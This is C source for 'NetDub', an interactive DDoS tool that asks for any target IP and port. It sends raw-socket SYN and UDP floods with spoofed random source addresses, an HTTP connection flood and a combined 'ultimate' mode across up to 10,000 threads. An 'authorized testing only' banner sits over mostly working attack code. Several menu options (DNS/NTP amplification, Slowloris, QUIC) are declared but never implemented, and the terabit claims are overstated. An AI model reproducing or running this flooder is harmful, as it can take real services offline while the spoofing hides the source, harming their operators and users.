/*
 * NetDub - Ultimate DDoS Testing Suite
 * ⚠️ FOR AUTHORIZED PENETRATION TESTING ONLY ⚠️
 * Root privileges required for raw socket operations
 * 
 * Compile: gcc -o netdub netdub.c -lpthread -lpcap
 * Usage: sudo ./netdub
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pcap.h>
#include <sys/time.h>
#include <fcntl.h>
#include <errno.h>

#define MAX_THREADS 10000
#define PACKET_SIZE 65536
#define BUFFER_SIZE 8192
#define MAX_PAYLOAD 1500

// Color codes
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define BLUE    "\033[1;34m"
#define MAGENTA "\033[1;35m"
#define CYAN    "\033[1;36m"
#define WHITE   "\033[1;37m"
#define RESET   "\033[0m"

// Global variables
volatile int running = 1;
volatile uint64_t packets_sent = 0;
volatile uint64_t bytes_sent = 0;
char target_ip[256];
int target_port;
int attack_type;
int thread_count;
int packet_size;
int intensity;

// Attack types
typedef enum {
    LAYER3_FLOOD,      // IP flood
    LAYER4_SYN,        // SYN flood
    LAYER4_UDP,        // UDP flood
    LAYER4_ACK,        // ACK flood
    LAYER4_FRAGMENT,   // Fragment flood
    LAYER7_HTTP,       // HTTP flood
    LAYER7_HTTPS,      // HTTPS flood
    LAYER7_SLOWLORIS,  // Slowloris
    LAYER7_SLOWPOST,   // Slow POST
    AMPLIFICATION_DNS, // DNS amplification
    AMPLIFICATION_NTP, // NTP amplification
    REFLECTION_SSDP,   // SSDP reflection
    MODERN_QUIC,       // QUIC flood
    MODERN_HTTP2,      // HTTP/2 flood
    MODERN_WEBSOCKET,  // WebSocket flood
    HYBRID_VOLUMETRIC, // Multi-layer volumetric
    FINALE_ULTIMATE    // Ultimate combination
} attack_type_t;

// Packet structures
struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
};

// Thread data structure
typedef struct {
    int thread_id;
    struct sockaddr_in target;
    int socket_fd;
    char payload[MAX_PAYLOAD];
} thread_data_t;

// Statistics
typedef struct {
    uint64_t packets_per_second;
    uint64_t bytes_per_second;
    uint64_t total_packets;
    uint64_t total_bytes;
    double terabits_per_second;
} stats_t;

// Function prototypes
void signal_handler(int sig);
void print_banner();
void print_menu();
void get_target_info();
void setup_attack();
void start_attack();
void *attack_thread(void *arg);
void *stats_thread(void *arg);
uint16_t checksum(void *vdata, size_t length);
uint32_t random_ip();
uint16_t random_port();
void create_raw_socket(int *sockfd);
void spoof_packet(int sockfd, struct sockaddr_in *target);

// Layer 3 attacks
void *layer3_flood_thread(void *arg);
void *layer4_syn_thread(void *arg);
void *layer4_udp_thread(void *arg);
void *layer4_ack_thread(void *arg);
void *layer4_fragment_thread(void *arg);

// Layer 7 attacks
void *layer7_http_thread(void *arg);
void *layer7_https_thread(void *arg);
void *layer7_slowloris_thread(void *arg);
void *layer7_slowpost_thread(void *arg);

// Amplification attacks
void *amplification_dns_thread(void *arg);
void *amplification_ntp_thread(void *arg);
void *reflection_ssdp_thread(void *arg);

// Modern attacks
void *modern_quic_thread(void *arg);
void *modern_http2_thread(void *arg);
void *modern_websocket_thread(void *arg);

// Ultimate attacks
void *hybrid_volumetric_thread(void *arg);
void *finale_ultimate_thread(void *arg);

// Signal handler
void signal_handler(int sig) {
    printf(YELLOW "\n[!] Attack terminated by user\n" RESET);
    running = 0;
}

// Print banner
void print_banner() {
    printf(RED);
    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║                        NetDub v2.0                           ║\n");
    printf("║                 Ultimate DDoS Testing Suite                  ║\n");
    printf("║                    Root Access Required                      ║\n");
    printf("╠═══════════════════════════════════════════════════════════════╣\n");
    printf("║  ⚠️  FOR AUTHORIZED PENETRATION TESTING ONLY ⚠️             ║\n");
    printf("║  Multi-layer DDoS simulation with Tbps capabilities          ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n");
    printf(RESET);
}

// Print attack menu
void print_menu() {
    printf(CYAN "\n📋 Attack Types Available:\n" RESET);
    printf(GREEN "Layer 3 (Network):\n" RESET);
    printf("  1. IP Flood             - Raw IP packet flood\n");
    
    printf(GREEN "Layer 4 (Transport):\n" RESET);
    printf("  2. SYN Flood           - TCP SYN flood attack\n");
    printf("  3. UDP Flood           - UDP packet flood\n");
    printf("  4. ACK Flood           - TCP ACK flood\n");
    printf("  5. Fragment Flood      - IP fragmentation attack\n");
    
    printf(GREEN "Layer 7 (Application):\n" RESET);
    printf("  6. HTTP Flood          - HTTP GET/POST flood\n");
    printf("  7. HTTPS Flood         - HTTPS flood with SSL\n");
    printf("  8. Slowloris           - Slow HTTP headers\n");
    printf("  9. Slow POST           - Slow HTTP POST\n");
    
    printf(GREEN "Amplification:\n" RESET);
    printf(" 10. DNS Amplification   - DNS reflection attack\n");
    printf(" 11. NTP Amplification   - NTP reflection attack\n");
    printf(" 12. SSDP Reflection     - SSDP reflection attack\n");
    
    printf(GREEN "Modern Protocols:\n" RESET);
    printf(" 13. QUIC Flood          - QUIC protocol flood\n");
    printf(" 14. HTTP/2 Flood        - HTTP/2 stream flood\n");
    printf(" 15. WebSocket Flood     - WebSocket connection flood\n");
    
    printf(RED "Ultimate Attacks:\n" RESET);
    printf(" 16. Hybrid Volumetric   - Multi-layer combination\n");
    printf(" 17. FINALE ULTIMATE     - Maximum devastation\n");
    
    printf(YELLOW "\n🎯 Intensity Levels:\n" RESET);
    printf("  1. Light Test          - 1K PPS, 1 Mbps\n");
    printf("  2. Medium Test         - 10K PPS, 10 Mbps\n");
    printf("  3. Heavy Test          - 100K PPS, 100 Mbps\n");
    printf("  4. Extreme Test        - 1M PPS, 1 Gbps\n");
    printf("  5. FINALE TEST         - 10M PPS, 10 Gbps\n");
    printf("  6. IMPOSSIBLE MODE     - 100M PPS, 100 Gbps\n");
    printf("  7. TERABIT DESTROYER   - 1B PPS, 1 Tbps\n");
}

// Get target information
void get_target_info() {
    printf(CYAN "\n🎯 Target Configuration:\n" RESET);
    printf("Enter target IP/domain: ");
    fgets(target_ip, sizeof(target_ip), stdin);
    target_ip[strcspn(target_ip, "\n")] = 0;
    
    printf("Enter target port: ");
    scanf("%d", &target_port);
    
    printf("Select attack type (1-17): ");
    scanf("%d", &attack_type);
    
    printf("Select intensity level (1-7): ");
    scanf("%d", &intensity);
    
    // Calculate thread count based on intensity
    switch(intensity) {
        case 1: thread_count = 10; packet_size = 64; break;
        case 2: thread_count = 100; packet_size = 128; break;
        case 3: thread_count = 1000; packet_size = 256; break;
        case 4: thread_count = 5000; packet_size = 512; break;
        case 5: thread_count = 8000; packet_size = 1024; break;
        case 6: thread_count = 10000; packet_size = 1400; break;
        case 7: thread_count = 10000; packet_size = 1500; break;
        default: thread_count = 1000; packet_size = 512; break;
    }
}

// Setup attack parameters
void setup_attack() {
    printf(YELLOW "\n⚙️  Attack Configuration:\n" RESET);
    printf("Target: %s:%d\n", target_ip, target_port);
    printf("Attack Type: %d\n", attack_type);
    printf("Threads: %d\n", thread_count);
    printf("Packet Size: %d bytes\n", packet_size);
    printf("Intensity: %d\n", intensity);
    
    printf(RED "\n⚠️  WARNING: This will generate massive traffic!\n" RESET);
    printf("Continue? (y/N): ");
    char confirm;
    scanf(" %c", &confirm);
    
    if(confirm != 'y' && confirm != 'Y') {
        printf("Attack cancelled.\n");
        exit(0);
    }
}

// Random IP generation
uint32_t random_ip() {
    return (rand() % 256) << 24 | (rand() % 256) << 16 | (rand() % 256) << 8 | (rand() % 256);
}

// Random port generation
uint16_t random_port() {
    return rand() % 65535 + 1;
}

// Checksum calculation
uint16_t checksum(void *vdata, size_t length) {
    char *data = (char *)vdata;
    uint32_t acc = 0xffff;
    
    for (size_t i = 0; i + 1 < length; i += 2) {
        uint16_t word;
        memcpy(&word, data + i, 2);
        acc += ntohs(word);
        if (acc > 0xffff) {
            acc -= 0xffff;
        }
    }
    
    if (length & 1) {
        uint16_t word = 0;
        memcpy(&word, data + length - 1, 1);
        acc += ntohs(word);
        if (acc > 0xffff) {
            acc -= 0xffff;
        }
    }
    
    return htons(~acc);
}

// Create raw socket
void create_raw_socket(int *sockfd) {
    *sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (*sockfd < 0) {
        perror("Raw socket creation failed - need root privileges");
        exit(1);
    }
    
    int one = 1;
    if (setsockopt(*sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt failed");
        exit(1);
    }
}

// Layer 4 SYN flood thread
void *layer4_syn_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    int sockfd;
    char packet[PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct sockaddr_in target;
    struct pseudo_header psh;
    
    create_raw_socket(&sockfd);
    
    target.sin_family = AF_INET;
    target.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target.sin_addr);
    
    while (running) {
        memset(packet, 0, PACKET_SIZE);
        
        // IP header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = htons(rand());
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = random_ip();
        iph->daddr = target.sin_addr.s_addr;
        iph->check = checksum((unsigned short *)packet, iph->tot_len);
        
        // TCP header
        tcph->source = htons(random_port());
        tcph->dest = htons(target_port);
        tcph->seq = rand();
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(65535);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        
        // Pseudo header for TCP checksum
        psh.source_address = iph->saddr;
        psh.dest_address = iph->daddr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));
        
        char pseudogram[sizeof(struct pseudo_header) + sizeof(struct tcphdr)];
        memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
        
        tcph->check = checksum((unsigned short *)pseudogram, sizeof(struct pseudo_header) + sizeof(struct tcphdr));
        
        if (sendto(sockfd, packet, iph->tot_len, 0, (struct sockaddr *)&target, sizeof(target)) > 0) {
            __sync_fetch_and_add(&packets_sent, 1);
            __sync_fetch_and_add(&bytes_sent, iph->tot_len);
        }
        
        if (intensity < 5) usleep(1000 / intensity);
    }
    
    close(sockfd);
    return NULL;
}

// Layer 4 UDP flood thread
void *layer4_udp_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    int sockfd;
    char packet[PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    struct sockaddr_in target;
    char *payload = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    
    create_raw_socket(&sockfd);
    
    target.sin_family = AF_INET;
    target.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target.sin_addr);
    
    // Generate random payload
    for (int i = 0; i < packet_size - sizeof(struct iphdr) - sizeof(struct udphdr); i++) {
        payload[i] = rand() % 256;
    }
    
    while (running) {
        memset(packet, 0, sizeof(struct iphdr) + sizeof(struct udphdr));
        
        // IP header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + (packet_size - sizeof(struct iphdr) - sizeof(struct udphdr));
        iph->id = htons(rand());
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;
        iph->saddr = random_ip();
        iph->daddr = target.sin_addr.s_addr;
        iph->check = checksum((unsigned short *)packet, iph->tot_len);
        
        // UDP header
        udph->source = htons(random_port());
        udph->dest = htons(target_port);
        udph->len = htons(sizeof(struct udphdr) + (packet_size - sizeof(struct iphdr) - sizeof(struct udphdr)));
        udph->check = 0;
        
        if (sendto(sockfd, packet, iph->tot_len, 0, (struct sockaddr *)&target, sizeof(target)) > 0) {
            __sync_fetch_and_add(&packets_sent, 1);
            __sync_fetch_and_add(&bytes_sent, iph->tot_len);
        }
        
        if (intensity < 6) usleep(100 / intensity);
    }
    
    close(sockfd);
    return NULL;
}

// Layer 7 HTTP flood thread
void *layer7_http_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    int sockfd;
    char request[2048];
    struct sockaddr_in target;
    
    while (running) {
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) continue;
        
        target.sin_family = AF_INET;
        target.sin_port = htons(target_port);
        inet_pton(AF_INET, target_ip, &target.sin_addr);
        
        if (connect(sockfd, (struct sockaddr *)&target, sizeof(target)) == 0) {
            snprintf(request, sizeof(request),
                "GET /?%d HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: Mozilla/5.0 (compatible; NetDub/2.0)\r\n"
                "Accept: */*\r\n"
                "Connection: close\r\n\r\n",
                rand(), target_ip);
            
            if (send(sockfd, request, strlen(request), 0) > 0) {
                __sync_fetch_and_add(&packets_sent, 1);
                __sync_fetch_and_add(&bytes_sent, strlen(request));
            }
        }
        
        close(sockfd);
        if (intensity < 4) usleep(10000 / intensity);
    }
    
    return NULL;
}

// Finale Ultimate thread - combines all attack types
void *finale_ultimate_thread(void *arg) {
    thread_data_t *data = (thread_data_t *)arg;
    int attack_mode = data->thread_id % 5;
    
    switch (attack_mode) {
        case 0: return layer4_syn_thread(arg);
        case 1: return layer4_udp_thread(arg);
        case 2: return layer7_http_thread(arg);
        case 3: return layer4_syn_thread(arg);
        case 4: return layer4_udp_thread(arg);
        default: return layer4_syn_thread(arg);
    }
}

// Statistics thread
void *stats_thread(void *arg) {
    uint64_t last_packets = 0, last_bytes = 0;
    time_t last_time = time(NULL);
    
    while (running) {
        sleep(1);
        
        time_t current_time = time(NULL);
        uint64_t current_packets = packets_sent;
        uint64_t current_bytes = bytes_sent;
        
        uint64_t pps = current_packets - last_packets;
        uint64_t bps = current_bytes - last_bytes;
        double tbps = (double)bps * 8 / 1000000000000.0;
        
        printf(CYAN "📊 [%ld] " RESET, current_time);
        printf(GREEN "PPS: %lu " RESET, pps);
        printf(YELLOW "BPS: %lu " RESET, bps);
        printf(RED "Tbps: %.6f " RESET, tbps);
        printf(MAGENTA "Total: %lu packets, %lu bytes\n" RESET, current_packets, current_bytes);
        
        last_packets = current_packets;
        last_bytes = current_bytes;
        last_time = current_time;
    }
    
    return NULL;
}

// Start attack
void start_attack() {
    pthread_t threads[MAX_THREADS];
    pthread_t stats_tid;
    thread_data_t thread_data[MAX_THREADS];
    
    printf(RED "\n🚀 Starting NetDub Ultimate Attack...\n" RESET);
    printf(YELLOW "Press Ctrl+C to stop\n" RESET);
    
    // Start statistics thread
    pthread_create(&stats_tid, NULL, stats_thread, NULL);
    
    // Start attack threads
    for (int i = 0; i < thread_count; i++) {
        thread_data[i].thread_id = i;
        
        void *(*thread_func)(void *) = NULL;
        
        switch (attack_type) {
            case 2: thread_func = layer4_syn_thread; break;
            case 3: thread_func = layer4_udp_thread; break;
            case 6: thread_func = layer7_http_thread; break;
            case 17: thread_func = finale_ultimate_thread; break;
            default: thread_func = layer4_syn_thread; break;
        }
        
        pthread_create(&threads[i], NULL, thread_func, &thread_data[i]);
        
        if (intensity >= 6) usleep(100);
        else usleep(1000);
    }
    
    // Wait for threads
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_join(stats_tid, NULL);
    
    printf(GREEN "\n✅ Attack completed!\n" RESET);
    printf("Total packets sent: %lu\n", packets_sent);
    printf("Total bytes sent: %lu\n", bytes_sent);
}

// Main function
int main() {
    // Check root privileges
    if (geteuid() != 0) {
        printf(RED "❌ This program requires root privileges!\n" RESET);
        printf("Please run with: sudo %s\n", __FILE__);
        return 1;
    }
    
    signal(SIGINT, signal_handler);
    srand(time(NULL));
    
    print_banner();
    print_menu();
    get_target_info();
    setup_attack();
    start_attack();
    
    return 0;
}
